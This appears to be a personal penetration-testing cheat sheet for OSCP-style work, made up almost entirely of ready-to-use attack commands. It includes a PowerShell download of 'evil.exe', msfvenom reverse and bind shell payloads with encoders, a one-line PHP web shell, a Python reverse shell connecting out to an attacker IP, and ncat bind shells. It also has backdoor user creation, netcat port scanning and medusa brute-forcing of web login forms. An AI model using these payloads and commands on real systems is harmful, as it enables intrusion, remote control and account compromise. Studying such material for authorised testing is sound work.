# Cybersecurity Cheatsheats
Collection of cybersecurity notes and cheat sheets.  If I pulled content from some else’s cheat sheet or site it will be listed reference section.

## User and group managment

Windows
```shell
net user bob bob123 /ADD
net localgroup "Remote Desktop Users" bob /ADD
net localgroup "Users" bob /ADD
```
## Starting services
linux
```shell
systemctl start ssh
systemctl start apache2
service apache2 start
```



## Enable/Disable service to start on boot
linux
```shell
systemctl enable apache2
systemctl disable apache2
```
## Download files

Powershell
```powershell
powershell (new-object System.Net.WebClient).DownloadFile('http://[your_ip_address]/evil.exe','evil.exe')
```

## msfvenom examples
```shell
msfvenom -p windows/shell_reverse_tcp  HOST=[your_ip_address] LPORT=[Port] -f asp > shell.asp
```

```shell
msfvenom -p windows/meterpreter/reverse_tcp [your_ip_address] LPORT=[Port] -f aspx > shell.aspx
```

```shell
msfvenom -p linux/x86/shell\_bind\_tcp LPORT=[port]-f c -b "\\x00\\x0a\\x0d\\x20" –e x86/shikata\_ga\_nai
```

```shell
msfvenom -p windows/shell\_reverse\_tcp LHOST=<IP Address> LPORT=[port]-b "\\x00\\x0a\\x0d" -f c -a x86 --platform windows -e x86/shikata\_ga\_nai
```

## shells

PHP

```php
<<?php echo shell_exec($_GET['cmd']);?>
```

Python

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<IP Address>",443))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)p=subprocess.call(["/bin/sh","-i"])
```

### Netcat

-   Client nc –nv <Your IP Address> <port>
-   Server nc –nlvp <port>

### Ncat

-   Bind Shell: ncat –exec cmd.exe --allow <your_ip_address>-vnl <port>  --ssl
-   Client: ncat –v <your_ip_address> <port> --ssl
  
## Ncat 
-   TCP Port scan: nc –nvv –w 1 -z <your_ip_address> 3000-4000
-   UDP port scan: nc –nvv -u -z <your_ip_address> 3000-4000


## Iptables

-   Allow input on port: iptables -A INPUT -p tcp --dport [port] -j ACCEPT
-   iptables -A INPUT -p tcp --dport 22 -j ACCEPT
-   iptables -A INPUT -p udp--dport 22 -j ACCEPT
-   Traffic analysis
    -   iptables -I INPUT 1 -s [your_ip_address]-j ACCEPT
    -   iptables -I OUTPUT 1 -s [your_ip_address]-j ACCEPT
    -   iptables –Z
    -   iptables –vn -L

-   Clean up rules: iptables -F INPUT

medusa example
```shell
medusa \
  -h [target_ip] \
  -u offsec \
  -P nmap.lst \
  -M web-form \
  -m FORM:"login.php" \
  -m DENY-SIGNAL:"Wrong Username or Password" \
  -m FORM-DATA:"post?user=&pass=&Login=Login"


  medusa \
-h [target_ip]\
-u admin \
-P /data/dict/dict.txt \
-M web-form \
-m FORM:"admin/test.php" \
-m DENY-SIGNAL:"ACCESS DENIED" \
-m FORM-DATA:"post?u=&p=&Login=Login"
```


## References
* http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect
* http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
* http://pentestmonkey.net/tools/audit/unix-privesc-check
* http://pentestmonkey.net/tools/web-shells/php-reverse-shell
* http://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/
* http://www.computersecurity.org/computer-cyber-security-certifications-education-college-courses/cheat-sheet-how-to-pass-the-oscp-offensive-security-certified-professional-exam-step-by-step-guide-enumerating-services-part-2/
* http://www.computersecurity.org/computer-cyber-security-certifications-education-college-courses/cheat-sheet-how-to-pass-the-oscp-offensive-security-certified-professional-exam-step-by-step-guide-sqli-xss-web-app-attacks-part-5/
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
* https://blog.sucuri.net/2013/05/from-a-site-compromise-to-full-root-access-local-root-exploits-part-ii.html
* https://hackingandsecurity.blogspot.com/2016/04/oscp-related-notes.html?m=1
* https://hackingandsecurity.blogspot.com/2016/04/oscp-related-notes.html?m=1
* https://hackmag.com/security/reach-the-root/
* https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
* https://highon.coffee/blog/tr0ll-1-walkthrough/
* https://jordanpotti.com/oscp/
* https://jordanpotti.com/oscp/
* https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
* https://security.stackexchange.com/questions/68442/escalating-from-apache-shell-to-root
